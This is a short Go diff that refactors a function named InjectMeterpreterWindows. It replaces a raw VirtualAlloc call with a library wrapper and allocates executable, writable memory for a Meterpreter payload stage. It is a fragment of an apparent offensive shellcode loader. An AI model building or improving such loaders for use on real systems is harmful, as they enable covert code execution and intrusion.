@@ -17,13 +17,13 @@ func InjectMeterpreterWindows(stage []byte) error {
 		return fmt.Errorf("empty stage")
 	}
 
-	addr, _, err := api.ProcVirtualAlloc.Call(
+	addr, err := windows.VirtualAlloc(
 		0,
 		uintptr(len(stage)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_EXECUTE_READWRITE,
 	)
-	if addr == 0 {
+	if err != nil {
 		return fmt.Errorf("VirtualAlloc: %w", err)
 	}
 
